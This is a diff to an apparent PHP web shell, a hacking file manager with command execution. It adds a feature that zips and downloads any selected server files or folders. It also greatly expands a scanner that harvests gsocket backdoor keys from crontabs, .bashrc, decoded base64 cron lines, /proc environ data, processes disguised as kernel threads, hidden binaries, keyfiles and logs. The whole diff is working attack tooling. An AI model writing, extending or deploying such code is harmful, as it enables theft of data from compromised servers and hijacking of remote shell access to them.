@@ -422,6 +422,49 @@ if (isset($_POST['go'])) {
         }
     }
 }
+if (isset($_POST['act']) && $_POST['act'] === 'dl' && !empty($_POST['files'])) {
+    $dldir  = isset($_POST['dir']) ? strdir(chop($_POST['dir']) . '/') : THISDIR;
+    $dlfiles = $_POST['files'];
+    if (count($dlfiles) === 1 && is_file(strdir($dldir . $dlfiles[0]))) {
+        filed(strdir($dldir . $dlfiles[0])); // exits inside
+    }
+    $tmpzip  = tempnam(sys_get_temp_dir(), 'hxdl_') . '.zip';
+    $dlname  = (count($dlfiles) === 1 ? $dlfiles[0] : 'files_' . date('YmdHis')) . '.zip';
+    $dlok    = false;
+    if (class_exists('ZipArchive')) {
+        $zip = new ZipArchive();
+        if ($zip->open($tmpzip, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
+            foreach ($dlfiles as $dlentry) {
+                $dlep = strdir($dldir . $dlentry);
+                if (is_dir($dlep)) {
+                    $dlit = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dlep, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::LEAVES_ONLY);
+                    foreach ($dlit as $dlfi) {
+                        $dlfp  = $dlfi->getRealPath();
+                        $dlrel = $dlentry . '/' . str_replace('\\', '/', substr($dlfp, strlen(rtrim($dlep, '/\\')) + 1));
+                        $zip->addFile($dlfp, $dlrel);
+                    }
+                } elseif (is_file($dlep)) {
+                    $zip->addFile($dlep, $dlentry);
+                }
+            }
+            $zip->close();
+            $dlok = true;
+        }
+    } else {
+        $dlargs = implode(' ', array_map('escapeshellarg', $dlfiles));
+        command('cd ' . escapeshellarg($dldir) . ' && zip -r ' . escapeshellarg($tmpzip) . ' ' . $dlargs, $dldir);
+        $dlok = file_exists($tmpzip) && filesize($tmpzip) > 0;
+    }
+    if ($dlok) {
+        header('Content-Type: application/zip');
+        header('Content-Disposition: attachment; filename="' . $dlname . '"');
+        header('Content-Length: ' . filesize($tmpzip));
+        @ob_end_clean();
+        readfile($tmpzip);
+        @unlink($tmpzip);
+        exit;
+    }
+}
 ?>
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /><meta content="width=device-width, initial-scale=1" name="viewport"/><style type="text/css">* {margin:0px;padding:0px;}body {background:#CCCCCC;color:#333333;font-size:13px;font-family:Verdana,Arial,SimSun,sans-serif;text-align:left;word-wrap:break-word; word-break:break-all;}a{color:#000000;text-decoration:none;vertical-align:middle;}a:hover{color:#FF0000;text-decoration:underline;}p {padding:1px;line-height:1.6em;}h1 {color:#CD3333;font-size:13px;display:inline;vertical-align:middle;}h2 {color:#008B45;font-size:13px;display:inline;vertical-align:middle;}form {display:inline;}input,select { vertical-align:middle; }input[type=text], textarea {padding:1px;font-family:Courier New,Verdana,sans-serif;}input[type=submit], input[type=button] {height:21px;}.tag {text-align:center;margin-left:10px;background:threedface;height:25px;padding-top:5px;}.tag a {background:#FAFAFA;color:#333333;width:90px;height:20px;display:inline-block;font-size:15px;font-weight:bold;padding-top:5px;}.tag a:hover, .tag a.current {background:#EEE685;color:#000000;text-decoration:none;}.main {width:963px;margin:0 auto;padding:10px;}.outl {border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;}.toptag {padding:5px;text-align:left;font-weight:bold;color:#FFFFFF;background:#293F5F;}.footag {padding:5px;text-align:center;font-weight:bold;color:#000000;background:#999999;}.msgbox {padding:5px;background:#EEE685;text-align:center;vertical-align:middle;}.actall {background:#F9F6F4;text-align:center;font-size:15px;border-bottom:1px solid #999999;padding:3px;vertical-align:middle;}.tables {width:100%;}.tables th {background:threedface;text-align:left;border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;padding:2px;}.tables td {background:#F9F6F4;height:19px;padding-left:2px;}.tables tr:hover td {background-color: #EEE685;}</style><script type="text/javascript">function $(ID) { return document.getElementById(ID); }function sd(str) { str = str.replace(/%22/g,'"'); str = str.replace(/%27/g,"'"); return str; }function cd(dir) { dir = sd(dir); $('dir').value = dir; $('frm').submit(); }function sa(form) { for(var i = 0;i < form.elements.length;i++) { var e = form.elements[i]; if(e.type == 'checkbox') { if(e.name != 'chkall') { e.checked = form.chkall.checked; } } } }function go(a,b) { b = sd(b); $('go').value = a; $('govar').value = b; if(a == 'editor') { $('gofrm').target = "_blank"; } else { $('gofrm').target = ""; } $('gofrm').submit(); } function nf(a,b) { re = prompt("New name",b); if(re) { $('go').value = a; $('govar').value = re; $('gofrm').submit(); } } function dels(a) { if(a == 'b') { var msg = ""; $('act').value = a; } else { var msg = ""; $('act').value = 'deltree'; $('var').value = a; } if(confirm("Are you sure you want to delete? "+msg+"")) { $('frm1').submit(); } }function txts(m,p,a) { p = sd(p); re = prompt(m,p); if(re) { $('var').value = re; $('act').value = a; $('frm1').submit(); } }function acts(p,a,f) { p = sd(p); f = sd(f); re = prompt(f,p); if(re) { $('var').value = re+'|x|'+f; $('act').value = a; $('frm1').submit(); } }</script><title><?php 
 $sitename = $_SERVER['SERVER_NAME'];
@@ -1171,8 +1214,9 @@ switch ($_POST['go']) {
         echo '<input type="button" value="Perm" style="width:50px;" onclick=\'txts("Change Permission","0666","c");\'> ';
         echo '<input type="button" value="Time" style="width:50px;" onclick=\'txts("Change the time","' . $mtime . '","d");\'> ';
         echo '<input type="button" value="Zip" style="width:50px;" onclick="zipsel();"> ';
+        echo '<input type="button" value="Download" style="width:68px;" onclick="dlsel();"> ';
         echo 'Total dir[' . $dnum . '] - Total file[' . $fnum . '] - Permission[' . $chmod . ']</div></form>';
-        echo '<script>function zipsel(){var n=prompt("ZIP filename (blank=auto)","");if(n===null)return;$("var").value=n;$("act").value="zip";$("frm1").submit();}function unzipf(f){if(confirm("Extract "+f+" to current directory?")){$("var").value=f;$("act").value="unzip";$("frm1").submit();}}</script>';
+        echo '<script>function zipsel(){var n=prompt("ZIP filename (blank=auto)","");if(n===null)return;$("var").value=n;$("act").value="zip";$("frm1").submit();}function unzipf(f){if(confirm("Extract "+f+" to current directory?")){$("var").value=f;$("act").value="unzip";$("frm1").submit();}}function dlsel(){var c=0,els=$("frm1").elements;for(var i=0;i<els.length;i++){if(els[i].name=="files[]"&&els[i].checked)c++;}if(!c){alert("Select at least one file or folder.");return;}$("act").value="dl";$("frm1").submit();}</script>';
         break;
     case "gsocket":
         if ($win) {
@@ -1200,21 +1244,60 @@ switch ($_POST['go']) {
         $gres = array(); $gseen = array();
         $gsme   = $gsr('whoami') ?: 'www-data';
         $gshome = $gsr('echo ~');
-        // 1. Crontab
+        // Extract gsocket keys from text — all known formats:
+        // -s KEY, S="KEY", S='KEY', SS_SECRET=KEY
+        $gs_keys = function($text) {
+            $out = [];
+            preg_match_all('/-s\s+["\']?([A-Za-z0-9_\-]{8,})["\']?/', $text, $m); foreach ($m[1] as $v) $out[] = trim($v, '"\'');
+            preg_match_all('/\bS=["\']([^"\']{8,})["\']/', $text, $m);              foreach ($m[1] as $v) $out[] = $v;
+            preg_match_all('/SS_SECRET=([A-Za-z0-9_\-]{8,})/', $text, $m);         foreach ($m[1] as $v) $out[] = $v;
+            return array_unique(array_filter($out));
+        };
+        // Read key from a gsocket -k keyfile (plain text, one line)
+        $gs_read_dat = function($path) {
+            $k = @file_get_contents($path);
+            if ($k === false || $k === '') return '';
+            $k = trim($k);
+            return preg_match('/^[A-Za-z0-9_\-]{8,64}$/', $k) ? $k : '';
+        };
+        // Decode base64 blobs in crontab and extract key via -k file or plain patterns
+        $gs_b64_cron = function($text) use ($gs_keys, $gs_read_dat) {
+            $found = array();
+            preg_match_all('/echo\s+([A-Za-z0-9+\/=]{40,})\s*\|[^|]*base64\s*-d/', $text, $bm);
+            foreach ($bm[1] as $b64) {
+                $dec = @base64_decode($b64, true);
+                if (!$dec) continue;
+                if (preg_match('/-k\s+(\S+)/', $dec, $dm)) {
+                    $k = $gs_read_dat($dm[1]);
+                    if ($k) $found[] = array('key'=>$k, 'detail'=>$dm[1].' (crontab b64 -k)');
+                }
+                foreach ($gs_keys($dec) as $k) $found[] = array('key'=>$k, 'detail'=>'crontab b64-decoded');
+            }
+            return $found;
+        };
+        // 1. Crontab + ~/.bashrc (gsocket.io installer writes to both)
         if ($do_cron) {
             $cout = $gsr('crontab -l');
-            if (preg_match_all('/-s\s+(\S+)/', $cout, $cm)) {
-                foreach ($cm[1] as $k) {
-                    if (!isset($gseen[$k])) { $gseen[$k]=1; $gres[]=array('src'=>'crontab','key'=>$k,'user'=>$gsme,'detail'=>'crontab -l','pid'=>''); }
-                }
+            foreach ($gs_keys($cout) as $k) {
+                if (!isset($gseen[$k])) { $gseen[$k]=1; $gres[]=array('src'=>'crontab','key'=>$k,'user'=>$gsme,'detail'=>'crontab -l','pid'=>''); }
+            }
+            foreach ($gs_b64_cron($cout) as $e) {
+                if (!isset($gseen[$e['key']])) { $gseen[$e['key']]=1; $gres[]=array('src'=>'crontab','key'=>$e['key'],'user'=>$gsme,'detail'=>$e['detail'],'pid'=>''); }
+            }
+            $brc = @file_get_contents("$gshome/.bashrc");
+            if ($brc) foreach ($gs_keys($brc) as $k) {
+                if (!isset($gseen[$k])) { $gseen[$k]=1; $gres[]=array('src'=>'crontab','key'=>$k,'user'=>$gsme,'detail'=>"$gshome/.bashrc",'pid'=>''); }
             }
             foreach (array('/var/spool/cron/crontabs', '/var/spool/cron') as $cd) {
                 foreach ((glob("$cd/*") ?: array()) as $cf) {
                     if (!is_file($cf) || !is_readable($cf)) continue;
                     $cu = basename($cf); $cc = @file_get_contents($cf);
-                    if ($cc && preg_match_all('/-s\s+(\S+)/', $cc, $cm2)) {
-                        foreach ($cm2[1] as $k) {
+                    if ($cc) {
+                        foreach ($gs_keys($cc) as $k) {
                             if (!isset($gseen[$k])) { $gseen[$k]=1; $gres[]=array('src'=>'crontab','key'=>$k,'user'=>$cu,'detail'=>$cf,'pid'=>''); }
+                        }
+                        foreach ($gs_b64_cron($cc) as $e) {
+                            if (!isset($gseen[$e['key']])) { $gseen[$e['key']]=1; $gres[]=array('src'=>'crontab','key'=>$e['key'],'user'=>$cu,'detail'=>$e['detail'],'pid'=>''); }
                         }
                     }
                 }
@@ -1222,7 +1305,7 @@ switch ($_POST['go']) {
         }
         // 2. Process list (hidden gsocket process names)
         if ($do_proc) {
-            $pg = $gsr("pgrep -a -E 'kstrp|watchdogd|ksmd|kswapd0|mm_percpu_wq|id_rsa'");
+            $pg = $gsr("pgrep -a -E 'kstrp|watchdogd|ksmd|kswapd0|mm_percpu_wq|id_rsa|slub_flushwq|kthreadd|rcu_sched|khugepaged|kdevtmpfs|deferwq|defunct'");
             foreach (explode("\n", $pg) as $line) {
                 $line = trim($line); if (!$line) continue;
                 $p = explode(' ', $line, 2); $pid = $p[0];
@@ -1233,23 +1316,37 @@ switch ($_POST['go']) {
                 $gres[]=array('src'=>'process','key'=>$k,'user'=>$gs_pu($pid),'detail'=>"PID $pid - $pname",'pid'=>$pid);
             }
         }
-        // 3. /proc/environ scan
+        // 3. /proc/environ scan — SS_SECRET and GS_ARGS=-k keyfile
         if ($do_env) {
-            $rl = $gsr("grep -rl 'SS_SECRET' /proc/*/environ");
-            foreach (explode("\n", $rl) as $ef) {
-                $ef = trim($ef);
-                if (!preg_match('#/proc/(\d+)/environ#', $ef, $epm)) continue;
-                $pid = $epm[1];
-                $k = $gsr("tr '\\000' '\\n' < /proc/$pid/environ | grep -oP 'SS_SECRET=\\K\\S+'");
-                if (!$k || isset($gseen[$k])) continue;
-                $gseen[$k]=1;
-                $gres[]=array('src'=>'/proc/env','key'=>$k,'user'=>$gs_pu($pid),'detail'=>"PID $pid",'pid'=>$pid);
+            foreach (array('SS_SECRET', 'GS_ARGS') as $gsenv) {
+                $rl = $gsr("grep -ral '$gsenv' /proc/*/environ");
+                foreach (explode("\n", $rl) as $ef) {
+                    $ef = trim($ef);
+                    if (!preg_match('#/proc/(\d+)/environ#', $ef, $epm)) continue;
+                    $pid = $epm[1];
+                    if ($gsenv === 'SS_SECRET') {
+                        $k = $gsr("tr '\\000' '\\n' < /proc/$pid/environ | grep -oP 'SS_SECRET=\\K\\S+'");
+                        if (!$k || isset($gseen[$k])) continue;
+                        $gseen[$k]=1;
+                        $gres[]=array('src'=>'/proc/env','key'=>$k,'user'=>$gs_pu($pid),'detail'=>"PID $pid",'pid'=>$pid);
+                    } else {
+                        // GS_ARGS="-k /path/to/file.dat ..." — read key from file
+                        $gsa = $gsr("tr '\\000' '\\n' < /proc/$pid/environ | grep '^GS_ARGS='");
+                        if (!$gsa || !preg_match('/-k\s+(\S+)/', $gsa, $dm)) continue;
+                        $k = $gs_read_dat($dm[1]);
+                        if (!$k || isset($gseen[$k])) continue;
+                        $gseen[$k]=1;
+                        $gres[]=array('src'=>'/proc/env','key'=>$k,'user'=>$gs_pu($pid),'detail'=>"PID $pid GS_ARGS keyfile ".$dm[1],'pid'=>$pid);
+                    }
+                }
             }
         }
-        // 4. Disk binary
+        // 4. Disk binary + .dat keyfiles
         if ($do_disk) {
-            $ssh = escapeshellarg("$gshome/.ssh");
-            $fd = $gsr("find /tmp /dev/shm /var/tmp $ssh -maxdepth 3 \\( -name 'defunct' -o -name '.gs' -o -name 'gs-netcat' -o -name 'id_rsa' \\) -type f");
+            $ssh    = escapeshellarg("$gshome/.ssh");
+            $cfg    = escapeshellarg("$gshome/.config");
+            // Binaries: defunct / .gs / gs-netcat in standard hidden dirs AND ~/.config/
+            $fd = $gsr("find /tmp /dev/shm /var/tmp $ssh $cfg -maxdepth 5 \\( -name 'defunct' -o -name '.gs' -o -name 'gs-netcat' -o -name 'id_rsa' \\) -type f 2>/dev/null");
             foreach (explode("\n", $fd) as $fp) {
                 $fp = trim($fp); if (!$fp || !file_exists($fp)) continue;
                 $k = $gsr('strings ' . escapeshellarg($fp) . " | grep -oP '(?<=-s )\\S+' | head -1");
@@ -1260,10 +1357,20 @@ switch ($_POST['go']) {
                 $gseen[$k]=1;
                 $gres[]=array('src'=>'disk','key'=>$k,'user'=>$ru,'detail'=>$fp.($pid?" (PID $pid)":''),'pid'=>($pid ?: ''));
             }
+            // .dat keyfiles (gsocket -k format: key stored as plain text in file)
+            $fd2 = $gsr("find /tmp /dev/shm $cfg -maxdepth 5 -name '*.dat' -type f 2>/dev/null");
+            foreach (explode("\n", $fd2) as $fp) {
+                $fp = trim($fp); if (!$fp) continue;
+                $k = $gs_read_dat($fp);
+                if (!$k || isset($gseen[$k])) continue;
+                $owner = $gsr("stat -c '%U' " . escapeshellarg($fp));
+                $gseen[$k]=1;
+                $gres[]=array('src'=>'disk','key'=>$k,'user'=>($owner ?: $gsme),'detail'=>$fp.' (keyfile)','pid'=>'');
+            }
         }
         // 5. Log files
         if ($do_log) {
-            foreach (array('/tmp/.gs_install.log','/tmp/.gs_py.log','/tmp/.gs.log',"$gshome/.gs_session.log") as $lf) {
+            foreach (array('/tmp/.gs_install.log','/tmp/.gs_py.log','/tmp/.gs.log',"$gshome/.gs_session.log","$gshome/.gsocket",'/tmp/.gsocket') as $lf) {
                 if (!@file_exists($lf) || !is_readable($lf)) continue;
                 $lc = @file_get_contents($lf); if (!$lc) continue;
                 $owner = $gsr("stat -c '%U' " . escapeshellarg($lf));
@@ -1279,7 +1386,7 @@ switch ($_POST['go']) {
             if ($gr['pid'] && ctype_digit((string)$gr['pid'])) {
                 $gr['live'] = file_exists('/proc/' . (int)$gr['pid']);
             } else {
-                $fl = $gsr('grep -rl ' . escapeshellarg('SS_SECRET='.$gr['key']) . ' /proc/*/environ');
+                $fl = $gsr('grep -ral ' . escapeshellarg('SS_SECRET='.$gr['key']) . ' /proc/*/environ');
                 preg_match('#/proc/(\d+)/environ#', $fl, $lpm);
                 $fpid = isset($lpm[1]) ? $lpm[1] : '';
                 $gr['live'] = ($fpid && file_exists('/proc/' . (int)$fpid));
@@ -1311,6 +1418,23 @@ switch ($_POST['go']) {
         // Results table
         if (!$gnk) {
             echo '<div class="actall">No gsocket keys found.</div>';
+            // Debug section — shows raw output of every scan command
+            $gs_dbg = array(
+                'whoami / echo ~'            => $gsr('whoami') . ' | home=' . $gshome,
+                'crontab -l'                 => $gsr('crontab -l') ?: '(empty)',
+                'cat ~/.bashrc | grep -iE SS_SECRET\|gs-netcat\|S=' => $gsr("cat " . escapeshellarg("$gshome/.bashrc") . " 2>/dev/null | grep -iE 'SS_SECRET|gs-netcat|S='") ?: '(not found)',
+                'grep -ral SS_SECRET /proc/*/environ' => $gsr('grep -ral SS_SECRET /proc/*/environ') ?: '(empty — no permission or no process)',
+                'pgrep -a -E defunct|slub|kstrp|watchdog|ksmd' => $gsr("pgrep -a -E 'defunct|slub_flushwq|kstrp|watchdogd|ksmd'") ?: '(empty)',
+                'ls -la /tmp/.gs* /tmp/.gsocket ~/.gsocket 2>&1' => $gsr("ls -la /tmp/.gs* /tmp/.gsocket " . escapeshellarg("$gshome/.gsocket") . " 2>&1") ?: '(nothing found)',
+                'cat /var/spool/cron/crontabs/* (if readable)' => $gsr('cat /var/spool/cron/crontabs/* 2>/dev/null || cat /var/spool/cron/* 2>/dev/null') ?: '(not readable)',
+            );
+            echo '<div class="actall" style="text-align:left;padding:6px 10px;">';
+            echo '<b style="color:#8B0000;">Debug output (0 keys found — paste this to diagnose):</b>';
+            foreach ($gs_dbg as $cmd => $out) {
+                echo '<br><code style="font-size:11px;color:#444;">$ ' . htmlspecialchars($cmd) . '</code>';
+                echo '<pre style="background:#F0F0F0;border:1px solid #CCC;font-size:11px;padding:4px 6px;margin:2px 0 6px;overflow-x:auto;white-space:pre-wrap;">' . htmlspecialchars(trim($out)) . '</pre>';
+            }
+            echo '</div>';
         } else {
             $gsc = array(
                 'crontab'   => 'background:#FFF3CC;color:#8B6000;border:1px solid #CCAA00',
